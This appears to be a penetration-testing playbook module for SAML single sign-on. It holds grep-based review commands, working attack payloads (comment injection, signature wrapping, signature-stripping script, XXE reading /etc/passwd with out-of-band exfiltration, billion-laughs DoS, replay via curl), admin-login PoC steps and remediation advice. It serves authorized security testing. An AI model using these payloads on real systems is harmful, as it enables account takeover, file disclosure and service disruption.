# VULN MODULE — SAML
# Asset: webapp
# Append to asset/webapp/module.md when target implements SAML-based SSO
# Report ID prefix: WEB-SAML

## THREAT MODEL

SAML assertions are XML documents signed by an Identity Provider (IdP) and consumed by a
Service Provider (SP). The SP's security model rests entirely on correct XML signature
verification. XML's canonical form and schema allow structural manipulation that preserves
a valid signature over a subset of the document while injecting attacker-controlled content:
- Signature Wrapping (XSW): the verified element is moved; an unsigned duplicate takes its place
- Comment injection exploits XML parsers that strip comments before use, while the signature
  was computed over the comment-containing canonical form
- XXE in XML parsing of the assertion can exfiltrate server files or trigger SSRF
- Replay attacks succeed when the SP does not validate the InResponseTo, NotOnOrAfter, or
  AssertionID against a consumed-token cache
- Signature exclusion attacks remove the Signature element entirely — some SPs accept unsigned assertions

## VULNERABILITY CLASSES

1.  XML Signature Wrapping (XSW)             CWE-347  — valid sig over moved element, forged body processed
2.  XML Comment Injection in NameID          CWE-138  — parser strips comment, identity changes
3.  Signature Exclusion                      CWE-347  — Signature element removed, assertion accepted unsigned
4.  Assertion Replay Attack                  CWE-294  — old assertion reused; InResponseTo / NotOnOrAfter unchecked
5.  XXE in SAML XML Parsing                  CWE-611  — external entity in DOCTYPE processed during assertion parse
6.  XSLT Injection                           CWE-91   — XSLT transforms applied to attacker-supplied stylesheet
7.  XML Injection in Assertion Attributes    CWE-91   — attribute values containing XML escape sequences
8.  NameID Format Confusion                  CWE-287  — SP trusts NameID format without IdP enforcement
9.  SAML Response Inflation / DoS            CWE-400  — billion-laughs XML entity expansion
10. Destination URL Not Validated            CWE-20   — assertion accepted by any SP regardless of Destination field

## WHITEBOX STATIC ANALYSIS

```bash
# Find SAML library usage
grep -rn "ruby-saml\|ruby_saml\|onelogin\|python-saml\|node-saml\|passport-saml\|samlify\|lasso\|spring.*saml\|Saml2\|OmniAuth::Strategies::SAML" \
  --include="*.rb" --include="*.py" --include="*.js" --include="*.ts" --include="*.java" --include="*.cs"

# Find assertion processing / decode calls
grep -rn "decode_response\|parse_assertion\|validate_response\|saml\.load\|SAML\.unpack\|response\.validate\|validate!" \
  --include="*.rb" --include="*.py" --include="*.js" --include="*.ts" -A10

# Signature verification — look for disabled or skipped checks
grep -rn "skip_signature\|validate_signature\|signature_check\|verify_signature\|wantAssertionsSigned\|wantMessagesSigned" \
  --include="*.rb" --include="*.py" --include="*.js" --include="*.ts" --include="*.xml" -A5
# Flag: skip_signature: true, validate_signature: false, or any surrounding comment explaining "disabled for testing"

# SignedInfo / Signed element reference — ensure the entire Response/Assertion is signed
grep -rn "SignedInfo\|Reference URI\|Transforms\|DigestMethod\|SignatureMethod" \
  --include="*.xml" --include="*.rb" --include="*.py" --include="*.js" -A5
# Flag: Reference URI="" (enveloped signature over entire doc) vs URI="#id" (only part of doc)

# NameID extraction — where is the identity established from?
grep -rn "NameID\|name_id\|nameId\|get_nameid\|name_identifier" \
  --include="*.rb" --include="*.py" --include="*.js" --include="*.ts" -A5
# Flag: raw XML text extraction without stripping XML comments
# Flag: first NameID element taken from document without scope checking

# Replay protection
grep -rn "InResponseTo\|NotOnOrAfter\|NotBefore\|AssertionID\|assertion.*cache\|replayed\|used_tickets" \
  --include="*.rb" --include="*.py" --include="*.js" --include="*.ts" -A5
# Flag: InResponseTo not validated against sent AuthnRequest ID
# Flag: NotOnOrAfter not enforced or clock skew window is excessive (>5 min)
# Flag: no assertion ID uniqueness cache

# XXE protection
grep -rn "DOCTYPE\|ENTITY\|expand_entities\|resolve_entities\|load_dtd\|noent\|libxml" \
  --include="*.rb" --include="*.py" --include="*.js" --include="*.ts" -A5
# Flag: Ruby Nokogiri without NOENT|NONET options
# Flag: Python lxml without resolve_entities=False
# Flag: PHP SimpleXML / DOMDocument without LIBXML_NOENT being absent

# Destination attribute enforcement
grep -rn "Destination\|destination\|acs_url\|assertion_consumer" \
  --include="*.rb" --include="*.py" --include="*.js" --include="*.ts" -A5
# Flag: Destination attribute not checked against configured ACS URL

# ruby-saml specific version (CVE-2024-45409 affects < 1.17.0)
grep -rn "ruby-saml\|ruby_saml" Gemfile Gemfile.lock 2>/dev/null
# Flag: ruby-saml < 1.17.0 is vulnerable to XSW via SignedInfo wrapping
```

## BLACKBOX TESTING PLAYBOOK

### Step 1 — Capture a valid SAML Response
```bash
# Use Burp Suite to intercept the POST to the SP's ACS URL
# The SAMLResponse parameter contains a base64-encoded XML document
# Decode it for analysis:
echo "BASE64_SAML_RESPONSE" | base64 -d | xmllint --format - 2>/dev/null

# Key elements to note:
# <samlp:Response ID="_xxx" Destination="https://sp.target.com/acs">
# <saml:Issuer>https://idp.provider.com</saml:Issuer>
# <ds:Signature> ... <ds:SignedInfo><ds:Reference URI="#_assertion_id">
# <saml:Assertion ID="_assertion_id">
#   <saml:Subject><saml:NameID>user@target.com</saml:NameID></saml:Subject>
```

### Step 2 — Comment injection in NameID
```xml
<!-- Original NameID -->
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
  attacker@evil.com
</saml:NameID>

<!-- Injected: XML comment splits the admin address. Parser strips comment → "admin@target.com" -->
<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
  attacker@evil.com<!---->@target.com
</saml:NameID>

<!-- Variation: suffix attack — strip domain, keep local part -->
<saml:NameID>admin<!--attacker@evil.com--></saml:NameID>
```
```bash
# Modify the decoded XML, re-encode, and POST to ACS:
MODIFIED=$(cat modified_saml.xml | base64 -w0)
curl -s -X POST "https://sp.target.com/auth/saml/callback" \
  --data-urlencode "SAMLResponse=$MODIFIED" \
  --data "RelayState=/" \
  -c cookies.txt -b cookies.txt -L -v
# Check: does session reflect attacker@evil.com or admin@target.com?
```

### Step 3 — Signature wrapping (XSW) attacks
```xml
<!-- XSW1: Move the legitimate Assertion outside the Signature scope,
     insert forged Assertion as the first child of Response -->

<!-- Original structure:
<Response>
  <Signature>
    <SignedInfo><Reference URI="#legit_id"/></SignedInfo>
    <SignatureValue>VALID_SIG</SignatureValue>
  </Signature>
  <Assertion ID="legit_id">
    <NameID>attacker@evil.com</NameID>
  </Assertion>
</Response> -->

<!-- XSW1 — forged Assertion inserted before Signature:
<Response>
  <Assertion ID="forged_id">         ← SP processes this first
    <NameID>admin@target.com</NameID>
  </Assertion>
  <Signature>
    <SignedInfo><Reference URI="#legit_id"/></SignedInfo>
    <SignatureValue>VALID_SIG</SignatureValue>  ← still valid over legit_id
  </Signature>
  <Assertion ID="legit_id">          ← signature covers this, but SP ignores it
    <NameID>attacker@evil.com</NameID>
  </Assertion>
</Response> -->

<!-- XSW2 — signed Assertion wrapped inside Extensions:
<Response>
  <Signature>
    <Object><Assertion ID="legit_id">...</Assertion></Object>
  </Signature>
  <Assertion ID="forged_id">
    <NameID>admin@target.com</NameID>
  </Assertion>
</Response> -->
```
```bash
# Automate XSW variants with SAMLRaider (Burp extension) or samlxsw tool
# Manual: decode, edit XML structure, re-encode, replay via Burp Repeater
```

### Step 4 — Signature exclusion
```bash
# Remove the entire <ds:Signature> block from the assertion
# Re-encode and POST to ACS
python3 - <<'EOF'
import base64, re, sys

saml_b64 = "BASE64_SAML_RESPONSE"
xml = base64.b64decode(saml_b64).decode()

# Strip Signature element
xml_stripped = re.sub(r'<ds:Signature\b.*?</ds:Signature>', '', xml, flags=re.DOTALL)

# Modify NameID
xml_stripped = xml_stripped.replace("attacker@evil.com", "admin@target.com")

print(base64.b64encode(xml_stripped.encode()).decode())
EOF
# POST the output as SAMLResponse — if SP accepts = signature exclusion confirmed
```

### Step 5 — XXE in SAML assertion
```xml
<!-- Inject DOCTYPE with external entity into the SAML XML before the root element -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```
```bash
# Encode and POST; check if /etc/passwd content appears in error or response body
# For blind XXE, use OOB via DNS/HTTP:
# <!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/?x="> or file:///etc/passwd via OOB channel
```

### Step 6 — Replay attack
```bash
# 1. Capture a valid SAMLResponse (already consumed — use from Burp history)
# 2. Replay it in a new browser session (different cookies/session):
curl -s -X POST "https://sp.target.com/auth/saml/callback" \
  --data-urlencode "SAMLResponse=BASE64_OLD_SAML" \
  --data "RelayState=/" \
  -c new_cookies.txt -L -v
# If login succeeds = NotOnOrAfter / assertion ID cache not enforced
# Note: assertion is typically valid for 5 minutes; test within window and also after expiry
```

### Step 7 — SAML response inflation (entity expansion DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [
  <!ENTITY a0 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
]>
<samlp:Response ...><saml:Issuer>&a3;</saml:Issuer></samlp:Response>
```
Report DoS only if it causes measurable service disruption (server OOM, process crash).
Out of scope if simply returns 400/413 immediately.

## DYNAMIC CONFIRMATION

### PoC: Comment injection → login as victim
```
1. Log into IdP as attacker@evil.com — obtain valid SAML assertion
2. Decode SAMLResponse, modify NameID:
     attacker@evil.com  →  admin<!---->@target.com
   (XML comment is valid; many parsers return "admin@target.com" after stripping comment)
3. Re-encode (base64) without re-signing
4. POST modified SAMLResponse to https://sp.target.com/auth/saml/callback
5. If SP parses identity as admin@target.com and creates authenticated session:
   - Capture session cookie
   - Access admin endpoint: GET /admin/dashboard
Confirmation: HTTP 200 on /admin with admin context confirms authentication bypass.
```

### PoC: XSW → login as different user
```
1. Log into IdP as attacker@evil.com — obtain valid SAML Response
2. Decode, apply XSW1 transformation:
   - Insert forged <Assertion ID="evil"> with NameID=admin@target.com before <Signature>
   - Keep original signed <Assertion ID="legit"> intact (attacker's identity)
3. Re-encode, POST to ACS endpoint
4. If SP processes the first (unsigned) Assertion and returns a session for admin@target.com:
   Confirmation: session cookie → GET /api/me returns {"email":"admin@target.com"}
```

## REPORT_BUNDLE FIELDS

```json
{
  "vulnerability_class": "SAML XML Signature Wrapping / Assertion Manipulation",
  "cwe": "CWE-347 | CWE-138 | CWE-611",
  "affected_endpoint": "https://sp.target.com/auth/saml/callback",
  "affected_parameter": "SAMLResponse",
  "evidence": {
    "original_nameid": "attacker@evil.com",
    "injected_nameid": "admin<!---->@target.com",
    "session_after_injection": "<session cookie>",
    "api_me_response": "{\"email\":\"admin@target.com\"}",
    "poc_steps": "<numbered reproduction steps>"
  },
  "impact": "Authentication bypass / Account takeover — login as arbitrary user including admins",
  "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N",
  "remediation": "Enforce Signature over entire Response and Assertion; strip XML comments before NameID extraction; pin expected Destination and Issuer; implement assertion ID replay cache; disable external entity resolution in XML parser"
}
```

## TOOLS

```bash
# SAMLRaider — Burp Suite extension for XSW attacks
# Install via Burp BApp Store: search "SAML Raider"
# Features: XSW variants 1–8, certificate import, signature removal, comment injection

# SAMLExtractor — extract and decode SAML from traffic
pip install saml-extractor

# saml-sp-test — automated SP security checks
# https://github.com/italia/spid-saml-check

# esaml — Erlang SAML library with known XSW test vectors (useful for reference)

# xmlsec1 — sign / verify / strip signatures manually
xmlsec1 --verify --id-attr:ID urn:oasis:names:tc:SAML:2.0:assertion:Assertion \
  --pubkey-cert-pem idp_cert.pem assertion.xml

# python-saml test tools
pip install python3-saml
# Modify src, run validation locally to understand what parser sees vs what signature covers
```
